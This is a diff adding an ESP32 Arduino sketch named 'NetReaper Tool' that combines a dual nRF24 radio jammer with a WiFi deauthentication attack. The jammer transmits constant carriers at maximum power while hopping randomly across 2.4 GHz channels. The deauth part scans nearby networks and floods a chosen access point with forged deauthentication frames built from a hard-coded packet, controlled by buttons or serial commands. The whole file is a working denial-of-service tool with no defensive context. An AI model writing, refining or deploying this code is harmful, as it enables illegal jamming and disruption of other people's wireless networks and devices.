@@ -1,0 +1,334 @@
+#include <SPI.h>
+#include <RF24.h>
+#include "esp_bt.h"
+#include "esp_wifi.h"
+#include "esp_system.h"
+#include <WiFi.h>
+
+// ================= BUTTON CONFIGURATION =================
+const int rfButtonPin = 4;       // D4 = GPIO 4 (Switch 1: RF Jammer)
+const int deauthButtonPin = 5;   // GPIO 5 (Switch 2: WiFi Deauth)
+
+bool isTransmitting = false;   
+bool isDeauthing = false;      
+bool autoStartDeauth = false;  
+// ========================================================
+
+// SPI Instances
+SPIClass *sp = nullptr; 
+SPIClass *hp = nullptr; 
+
+RF24 radio(27, 15, 16000000); 
+RF24 radio1(22, 21, 16000000); 
+
+int ch = 45;  
+int ch1 = 45; 
+
+// ================= NetReaper Variables =================
+struct WiFiNetwork {
+  String ssid;
+  uint8_t bssid[6];
+  int channel;
+  int rssi;
+};
+
+const uint8_t deauthPacket[26] = {
+  0xc0, 0x00, 0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x07, 0x00
+};
+
+int networkCount = 0;
+int targetChannel = 1;
+uint8_t targetBSSID[6];
+bool scanExecuted = false;
+bool deauthRunning = false;
+bool deauthExecuted = false;
+WiFiNetwork scannedNetworks[20];
+
+// =======================================================
+
+void disableWiFiAndBT() {
+  esp_wifi_stop(); 
+  btStop(); 
+}
+
+void startTransmission() {
+  Serial.println("\n>>> RF JAMMER ON: AGGRESSIVE RANDOM MODE STARTED");
+  
+  if (isDeauthing) {
+    stopDeauth();
+    isDeauthing = false;
+  }
+  
+  disableWiFiAndBT(); 
+  
+  radio1.powerUp();
+  radio1.setAutoAck(false);
+  radio1.stopListening(); 
+  radio1.setRetries(0, 0);
+  radio1.setPALevel(RF24_PA_MAX, true); 
+  radio1.setDataRate(RF24_2MBPS);       
+  radio1.setCRCLength(RF24_CRC_DISABLED); 
+  radio1.startConstCarrier(RF24_PA_MAX, ch1);
+
+  radio.powerUp();
+  radio.setAutoAck(false);
+  radio.stopListening(); 
+  radio.setRetries(0, 0);
+  radio.setPALevel(RF24_PA_MAX, true); 
+  radio.setDataRate(RF24_2MBPS);       
+  radio.setCRCLength(RF24_CRC_DISABLED); 
+  radio.startConstCarrier(RF24_PA_MAX, ch);
+}
+
+void stopTransmission() {
+  Serial.println("\n>>> RF JAMMER OFF: Transmission STOPPED");
+  radio.powerDown();
+  radio1.powerDown();
+}
+
+// ================= NetReaper Functions =================
+void startWiFiScan() {
+  Serial.println("[*] Scanning for networks... Please wait (2-3 seconds)...");
+  
+  esp_wifi_start(); 
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(); 
+  
+  networkCount = WiFi.scanNetworks(); 
+  
+  if (networkCount > 0) {
+    showScannedNetworks();
+    if (autoStartDeauth) {
+      startDeauth(0);
+      autoStartDeauth = false;
+    }
+  } else {
+    Serial.println("[!] No networks found!");
+  }
+  
+  scanExecuted = true;
+  Serial.println("[*] Scanning Completed!");
+}
+
+void showScannedNetworks() {
+  if (networkCount == 0) {
+    Serial.println("[!] No networks found!");
+    return;
+  }
+  Serial.println("\n[*] Scanned WiFi Networks:");
+  Serial.println("-------------------------------------------------");
+  for (int i = 0; i < networkCount && i < 20; i++) {
+    scannedNetworks[i].ssid = WiFi.SSID(i);
+    memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
+    scannedNetworks[i].channel = WiFi.channel(i);
+    scannedNetworks[i].rssi = WiFi.RSSI(i);
+    Serial.printf("[%02d] - SSID    : %s\n", i, scannedNetworks[i].ssid.c_str());
+    Serial.printf("       BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
+                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], 
+                      scannedNetworks[i].bssid[2], scannedNetworks[i].bssid[3], 
+                      scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
+    Serial.printf("       Channel : %d\n", scannedNetworks[i].channel);
+    Serial.printf("       RSSI    : %d dBm\n", scannedNetworks[i].rssi);
+    Serial.println("-------------------------------------------------");
+  }
+}
+
+void initDeauth() {
+  deauthRunning = false;
+  deauthExecuted = false;
+}
+
+void startDeauth(int index) {
+  if (index < 0 || index >= networkCount) {
+    Serial.println("[!] Invalid index!");
+    return;
+  }
+  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
+  targetChannel = scannedNetworks[index].channel;
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  Serial.printf("[*] Deauth Attack Started on %s (Channel: %d)\n", scannedNetworks[index].ssid.c_str(), targetChannel);
+  digitalWrite(2, HIGH);
+  esp_wifi_set_promiscuous(true);
+  deauthRunning = true;
+  deauthExecuted = true;
+  isDeauthing = true;
+}
+
+void sendDeauth() {
+  uint8_t packet[26];
+  memcpy(packet, deauthPacket, 26);
+  memcpy(&packet[10], targetBSSID, 6);
+  memcpy(&packet[16], targetBSSID, 6);
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+void stopDeauth() {
+  deauthRunning = false;
+  isDeauthing = false;
+  WiFi.mode(WIFI_STA);
+  digitalWrite(2, LOW);
+  esp_wifi_set_promiscuous(false);
+  Serial.println("[*] Deauth Attack Stopped!");
+}
+// =======================================================
+
+void checkRFButton() {
+  static int lastState = HIGH;
+  static unsigned long lastTime = 0;
+  int currentState = digitalRead(rfButtonPin);
+  
+  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
+    lastTime = millis();
+    isTransmitting = !isTransmitting;
+    
+    if (isTransmitting) {
+      startTransmission();
+    } else {
+      stopTransmission();
+    }
+  }
+  lastState = currentState;
+}
+
+void checkDeauthButton() {
+  static int lastState = HIGH;
+  static unsigned long lastTime = 0;
+  int currentState = digitalRead(deauthButtonPin);
+  
+  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
+    lastTime = millis();
+    
+    if (!isDeauthing) {
+      if (isTransmitting) {
+        stopTransmission();
+        isTransmitting = false;
+      }
+      
+      esp_wifi_start();
+      WiFi.mode(WIFI_STA);
+      
+      if (networkCount == 0 || !scanExecuted) {
+        autoStartDeauth = true;
+        startWiFiScan(); 
+      } else {
+        startDeauth(0); 
+      }
+    } else {
+      stopDeauth();
+    }
+  }
+  lastState = currentState;
+}
+
+void aggressiveRandomMode() {
+  uint8_t randCh1 = random(80);
+  uint8_t randCh = random(80);
+  
+  radio1.setChannel(randCh1);
+  radio.setChannel(randCh);
+}
+
+void initSP() {
+  sp = new SPIClass(VSPI);
+  sp->begin(18, 19, 23, 21); 
+  if (radio1.begin(sp)) {
+    Serial.println("VSPI (Radio1) Started !!!");
+  } else {
+    Serial.println("VSPI (Radio1) couldn't start !!!");
+  }
+}
+
+void initHP() {
+  hp = new SPIClass(HSPI);
+  hp->begin(14, 12, 13, 15); 
+  if (radio.begin(hp)) {
+    Serial.println("HSPI (Radio) Started !!!");
+  } else {
+    Serial.println("HSPI (Radio) couldn't start !!!");
+  }
+}
+
+void handleSerial() {
+  if (Serial.available()) {
+    String command = Serial.readStringUntil('\n');
+    command.trim();
+    if (command.equalsIgnoreCase("scan")) {
+      esp_wifi_start();
+      WiFi.mode(WIFI_STA);
+      startWiFiScan();
+    }
+    else if (command.startsWith("deauth ")) {
+      String arg = command.substring(7);
+      arg.trim();
+      if (arg.equalsIgnoreCase("off")) {
+        if (!deauthExecuted) {
+          Serial.println("[!] Deauth Network First!");
+        } else {
+          stopDeauth();
+        }
+      } else {
+        int index = arg.toInt();
+        startDeauth(index);
+      }
+    }
+    else if (command.equalsIgnoreCase("help")) {
+      Serial.println("\nAvailable Commands:");
+      Serial.println("  scan        - Scan for nearby WiFi networks");
+      Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
+      Serial.println("  deauth off  - Stop deauth attack");
+      Serial.println("  help        - Show this help message");
+    }
+    else {
+      Serial.println("[!] Invalid command. Type 'help' for available commands!");
+    }
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+  
+  setCpuFrequencyMhz(240);
+  
+  pinMode(rfButtonPin, INPUT_PULLUP);
+  pinMode(deauthButtonPin, INPUT_PULLUP);
+  pinMode(2, OUTPUT);
+  digitalWrite(2, LOW);
+  
+  initHP(); 
+  initSP(); 
+
+  stopTransmission();
+  WiFi.mode(WIFI_STA); 
+  initDeauth();
+
+  // Replaced fancy Unicode characters with standard ASCII to prevent copy-paste encoding errors
+  Serial.println("+====================================+");
+  Serial.println("|          NetReaper Tool            |");
+  Serial.println("|     DUAL ATTACK (RF + Deauth)      |");
+  Serial.println("+====================================+");
+  Serial.println("| Switch 1 (GPIO 4): Toggle RF Jammer|");
+  Serial.println("| Switch 2 (GPIO 5): Toggle Deauth   |");
+  Serial.println("+====================================+");
+  Serial.println("| Type 'help' for serial commands    |");
+  Serial.println("+====================================+");
+}
+
+void loop() {
+  checkRFButton();
+  checkDeauthButton();
+  handleSerial();
+  
+  if (isTransmitting) {
+    aggressiveRandomMode(); 
+  }
+  
+  if (deauthRunning) {
+    sendDeauth();
+    delay(50); 
+  }
+}
